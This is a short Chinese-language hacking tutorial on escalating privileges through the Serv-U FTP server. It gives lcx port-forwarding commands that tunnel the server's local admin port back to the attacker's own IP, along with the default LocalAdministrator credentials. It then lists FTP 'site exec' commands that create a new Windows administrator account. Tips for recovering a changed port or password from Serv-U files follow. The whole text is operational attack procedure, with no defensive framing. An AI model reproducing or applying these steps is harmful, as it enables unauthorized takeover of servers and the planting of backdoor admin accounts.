serv-u端口转发提权  前提是默认账号密码没改 或者密码自己知道

提权技巧之serv-u端口转发提权：

1、在服务器上cmd 执行： lcx -slave 我的IP 5000 127.0.0.1 43958(有可能被改)

2、 在本机运行 lcx -listen 5000 21 (lcx地址要写对)

3、 打开本地的serv u 在IP上填入127.0.0.1 帐号：LocalAdministrator 密码：#l@$ak#.lk;0@P (密码帐号有可能改 自己下文件看密码)

此时的链接过程是本机连接21端口----转发往本机5000端口-----管道连接至远程机5000端口------转发至远程43958端口

连接成功后，在本机登录的serv-u相当于远程的serv-u

可以ftp本机IP输入上面的帐号密码，在远程ftp服务器执行命令

1.quote site exec net user admin admin /add  
2.quote site exec net localgroup administrators admin /add



有个问题  serv-u的账号密码 能不能本机得到

在提权不成功,排除种种原因：

一、发现是servu默认端口被改的时候。

在servu的目录下的ServUStartUplog.txt 文件我们可以看到servu连接时的日志文件。

\serv-U\ServUStartUplog.txt 查看被修改的servU端口号

Sun .... xx:xx:xx - FTP...... on port number :[这边就是端口号]


二、如果默认用户名和密码被修改的时候，也可以到ServUAdmin.exe里查看。

三、在ServUDaemon.ini里可以查看准确的版本号。


serv-U提权时，asp提权不成功时，可以试试php版的serv-U提权。

也许可以成功，因为php权限比asp要大。还有aspx的
